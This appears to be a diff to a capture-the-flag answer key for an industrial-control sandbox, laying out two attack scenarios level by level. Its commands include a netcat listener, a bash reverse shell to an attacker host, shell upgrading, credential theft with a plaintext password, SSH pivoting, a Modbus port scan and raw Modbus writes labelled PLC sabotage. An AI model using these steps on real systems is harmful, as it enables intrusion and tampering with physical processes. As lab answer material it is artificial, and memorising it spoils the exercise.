@@ -1,26 +1,53 @@
-# Attacker Terminal (Kali) - Tab 1 (Start listener)
-nc -nlvp 4444
+# ==========================================
+# SCENARIO A: SIMPLE OT SANDBOX WALKTHROUGH
+# ==========================================
 
-# Node-RED Exec Node Command (Deploy and trigger to connect shell)
-bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
+# Level 1: Foothold Passkey
+start
 
-# Caught Netcat Shell (Run immediately to upgrade terminal)
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Level 2: Node-RED HMI Command (cat HMI flag)
+cat /root/flag.txt
 
-# Upgraded Shell (Read engineering credentials)
+# Level 3: Node-RED HMI Command (Inject Modbus TCP sabotage to PLC 192.168.99.10:502)
+python3 -c "import socket; s=socket.socket(); s.connect(('192.168.99.10',502)); s.sendall(b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x27\x0f'); s.recv(1024); s.close()"
+
+# Level 3: Node-RED HMI Command (Read PLC flag via SSH pivot)
+ssh -o StrictHostKeyChecking=no debian@192.168.99.10 "sudo cat /root/flag2.txt"
+
+
+# ==========================================
+# SCENARIO B: COMPLEX OT SANDBOX WALKTHROUGH
+# ==========================================
+
+# Level 1: Foothold Passkey
+start
+
+# Level 2: Node-RED HMI Command (cat HMI flag)
+cat /root/flag.txt
+
+# Level 2: Node-RED HMI Command (Cat operator SSH credentials)
 cat /home/debian/ews_credentials.txt
 
-# Upgraded Shell (Pivot to EWS)
+# Level 3: Attacker Terminal (Kali) - Tab 1 (Start listener)
+nc -nlvp 4444
+
+# Level 3: Node-RED HMI Command (Trigger reverse shell to Attacker 10.10.10.50:4444)
+bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
+
+# Level 3: Caught Netcat Shell (Run immediately on Kali to upgrade PTY)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Level 3: Upgraded Shell (SSH pivot from HMI to EWS)
 ssh operator@192.168.20.20
 
-# EWS Password (Copy and paste into SSH prompt)
+# Level 3: EWS Password (Type/Paste into SSH prompt)
 operator123
 
-# pivoted EWS Shell (Scan control subnet for Modbus devices)
+# Level 3: pivoted EWS Shell (Scan Control network for Modbus devices)
 nmap -p 502 --open 192.168.20.0/24
 
-# Pivoted EWS Shell (Execute Modbus sabotage on PLC)
+# Level 4: pivoted EWS Shell (Execute Modbus sabotage to PLC 192.168.20.10:502)
 modbus 192.168.20.10 0=0
 
-# Pivoted EWS Shell (Display final safety override flag)
+# Level 4: Pivoted EWS Shell (Display final safety override flag)
 cat /var/log/safety_override.txt
